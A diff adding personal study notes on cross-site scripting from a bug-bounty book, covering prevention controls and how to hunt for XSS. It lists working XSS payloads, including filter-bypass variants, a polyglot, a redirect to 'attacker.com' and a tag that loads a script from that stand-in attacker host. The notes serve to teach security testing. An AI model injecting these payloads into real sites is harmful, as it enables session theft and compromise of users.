@@ -1110,4 +1110,122 @@ Stored XSS (Includes Blind XSS), Reflected XSS, DOM-based XSS.
 - "If you've ever seen social media posts or text messages telling you to paste a piece of code into your browser to "do something cool," it was probably attack code aimed at tricking you into launching self-XSS against yourself.
 - These are often out of scope, because they require you to use social engineering to attack users directly.
 
+**Prevention**
+
+- Two main controls to prevent XSS:
+  - Robust input validation.
+  - Contextual output escaping and encoding.
+- Apps should never insert user-submitted data directly into an HTML document.
+  - Including inside <script> tags, HTML tag names, or attribute names.
+  - The server should validate the user-submitted input doesn't contain dangerous characters that might influence the way browsers interpret the information.
+  - You could block all requests that contain the <script> tag, for example, or sanitize it by removing or escaping special characters before further processing.
+- Escaping is when you encode special characters so that they're interpreted literally instead of as special characters.
+  - Encoding must be done in the format of the language being used (JavaScript for JavaScript, HTML for HTML, XML, JSON, CSS, etc.)
+  - For HTML, "<" and ">" can be escaped with &lt and &gt.
+- Escaping special characters so that the application won't interpret user input as code to execute is the most common way for modern apps to protect against XSS attacks.
+
+  - React, Angular 2+, and Vue.js do this automatically, so choosing the right framework is a great way to protect your applications.
+
+- DOM-based XSS, however, doesn't get passed to the server, so sanitization won't work.
+- To protect against DOM-based XSS, devs should avoid code that rewrites the HTML doc based on user input, and should implement client-side input validation before it's inserted into the DOM.
+
+- To mitigate against the damage of successful XSS attacks:
+  - Set the `HttpOnly` flag on sensitive cookies to prevent attackers from stealing those cookies.
+  - Implement the `Content-Security-Policy` response header to restrict how resources like JavsScript, CSS, or images load on your web pages.
+  - You can instruct the browser to execute only scripts from a list of sources.
+  - Visit [OWASP XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheet/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for even more info.
+
+#### Hunting for XSS
+
+- Look for places where user input get rendered on a page, check for reflected user input.
+- You can look for XSS in applications that communicate via non-HTTP protocols like SMTP, SNMP, DNS.
+  - The book suggestion checking out [Offensive Security's Advanced Web Attacks and Exploitation Training](https://www.offensive-security.com/awae-oswe/) if you're interested in these techniques.
+
+**Step 1: Look for Input Opportunities**
+
+- For Stored XSS, look for places where input get stored by the server and later displayed to the user: Comment fields, user profiles, and blog posts.
+- For Reflected XSS, look for forms, search boxes, name and username fields in sign-ups.
+- Don't limit yourself to text input fields. Drop-down menus and numeric fields also can allow for XSS through the use of a proxy (like BuprSuite).
+
+  - ex:
+
+  ```
+  POST /edit_user_age
+
+  (Post request body)
+  age=20
+  ```
+
+  - Could be tested with:
+
+  ```
+  POST /edit_user_age
+
+  (Post request body)
+  age=<script>alert('Vulnerable to XSS');</script>
+  ```
+
+- For reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user.
+  - Insert a custom string into each URL parameter and check whether it shows up in the returned page. Make the string very specific to make sure it was caused by the submission.
+  - Input the string "Vulnerable to XSS" into every user-input opportunity you can find, then search the pages source code for it with ctrl+f.
+
+**Step 2: Insert Payloads**
+
+- Once you've found some user input opportunities, start testing with XSS payloads. An alert payload is simple and effective:
+  `<script>alert('Vulnerable to XSS');</script>`
+
+  - This is nice because you get a pop-up if the attack is successful.
+  - This is less likely to work on modern web apps, but is more likely to work on IoT or embedded applications that don't use the latest frameworks.
+  - For IoT learning check out OWASP's [IoTGoat project](https://github.com/OWASP/IoTGoat/)
+
+- Changing the values of attributes in HTML tags is another way to try to sneak a payload into a web application.
+  - ex. of the `onload` event attribute running a script after the HTML element has loaded (similar for `onclick` and `onerror` event attributes):
+    `<img onload=alert('The image has been loaded!') src="example.png">`
+  - You can try inserting code into these attributes or adding a new event attribute into an HTML tag.
+- Try to achieve an XSS through special URL schemes like `javascript:` and `data:`.
+
+  - `javascript:` URL scheme allows you to execute JavaScript code specified in the URL.
+    `javascript:alert('Vulnerable to XSS')`
+  - The `data:` scheme allows you to embed small files in a URL, including JavaScript code:
+    `data:text/html:base64,PHNjcmlwdD5hbGVydCgnVnVsbmVyYWJsZSB0byBYU1MnKTwvc2NyaXB0Pg==`
+  - The above is the base64 encoded version of: `data:text/html:base64.<script>alert('Vulnerable to XSS')</script>`
+  - You don't need to base64 encode, but it's always a good idea to try this if a non-encoded payloads don't work as it can help bypass XSS filters (and any other injection filters for that matter).
+  - For more ways to execute JavaScript by bypassing XSS protection you can look on PortSwigger's [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/) for payload examples.
+  - It can be helpful to use multiple browsers to test for XSS because different browsers support different tags and event handlers.
+
+- "When inserting an XSS payload, you'll often have to close out a previous HTML tag by including its closing angle bracket. This is necessary when you're placing your user input inside one HTML element but want to run JavaScript using a different HTML element."
+  - Doing this avoids syntax errors.
+  - ex:
+    `<img src="USER_INPUT">`
+  - To close out the tag, you would need supply the following to the input field:
+    `"/><script>location="http://attacker.com";</script>`
+  - The target would then receive this:
+    `<img src=""/><script>location="http://attacker.com";</script>">`
+  - Use a proxy to check if the payload has caused syntax errors in the returned document.
+  - Use your browser to see if there are any errors loading the page.
+
+Table 6-1: Common XSS Payloads  
+ |Payload|Purpose|
+|---|---|
+|`<script>alert(1)</script>`| This is the most generic XSS payload. It will generate a pop-up box if the payload succeeds|
+|`<iframe src=javascript:alert(1)>`| This payload loads JavaScript code within an iframe. It's useful when <script> tags are banned by the XSS filter|
+|`<body onload=alert(1)>`| This paylaod is useful when your input string can't contain the term _script_. It inserts an HTML element that will run JavaScript automatically after it's loaded.|
+|`"><img src=x onerror=prompt(1);>`| This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.|
+|`<script>alert(1)<!-`| <! is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.|
+|`<a onmouseover"alert(1)">test</a>`| This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.|
+|`<script src=//attacker.com/test.js>`|This payload causes the browser to load and run an external script hosted on the attacker's server.|
+
+- Instead of testing the many payloads one by one to see if the application you're working on is vulnerable, you can use a polyglot.
+  - A polyglot is a payload that executes in multiple contexts - it will execute regardless of being inserted into an <img> tag, a <script> tag, or a generic <p> tag and can also bypass some XSS filters.
+- ex. from [EdOverflow](https://polyglot.innerht.ml/):
+
+```
+javascript:"/*\"/*' /*</template>
+</textarea></noembed></noscript></title>
+</style><script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+```
+
+- This polyglot contains multiple ways of creating an XSS so if one method fails, another method could still work.
+-
+
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
